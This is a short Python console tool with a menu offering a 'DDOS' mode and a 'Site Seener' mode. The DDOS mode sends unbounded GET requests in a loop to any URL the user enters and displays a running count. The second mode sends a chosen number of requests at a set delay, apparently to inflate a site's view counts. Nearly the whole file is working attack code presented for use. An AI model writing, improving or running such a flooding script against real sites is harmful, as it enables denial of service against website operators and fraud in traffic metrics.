from pyfiglet import Figlet
from color import colored
import requests, os, sys, curses, time

################## variables ####################
welcome_text = Figlet(font ='slant')
url = ''
delay = 0
count = 0
number = 0
################## functions ####################
def spinning_cursor():
    while True:
        for cursor in '|/-\\':
            yield cursor
spinner = spinning_cursor()


def ddos(window):
	global number, url
	while True:
		requests.get(url)
		number += 1
		curses.init_pair(1, 47, curses.COLOR_BLACK)
		window.addstr(0, 0, f'site open {number}/∞' + "   " +next(spinner), curses.color_pair(1))
		window.refresh()

def site_seener(window):
	global number, url, delay, count
	while True:
		requests.get(url)
		number += 1
		curses.init_pair(2, 47, curses.COLOR_BLACK)
		window.addstr(0, 0, f'site open {number}/{count}' + "   " +next(spinner), curses.color_pair(2))
		window.refresh()
		time.sleep(delay)
		if number == count:
			break
			url = ''
			delay = 0
			count = 0
			number = 0


################## backend #####################
w = welcome_text.renderText('welcome')
################## frontend ####################
print(w)
while True:
	print(colored("1 = DDOS 2 = Site Seener 3 = exit", color='Lgreen'))
	print(colored('Choose Of Them: ', color='Lgreen'),end='')
	start_app = input()
	if start_app == "1":
		while True:
			try:
				print(colored('enter site link: ', color='Lgreen'),end='')
				url = input()
				requests.get(url)
				break
			except:
				print('url is not valid!')
		while True:
			try:
				curses.wrapper(ddos)
			except:
				print('url is not valid!')
				break
	elif start_app == "2":
		while True:
			try:
				print(colored('enter site link: ', color='Lgreen'),end='')
				url = input()
				requests.get(url)
				break
			except:
				print('url is not valid!')
		while True:
			try:
				print(colored('enter amount of seen: ', color='Lgreen'),end='')
				count = int(input())
				break
			except:
				print("enter integer vlue")
		while True:
			try:
				print(colored('enter time of delay per open site: ', color='Lgreen'),end='')
				delay = float(input())
				break
			except:
				print("enter integer vlue")
		while True:
			try:
				curses.wrapper(site_seener)
				break
			except:
				print('url is not valid!')
				break	
	elif start_app == "3":
		break
	else:
		pass

				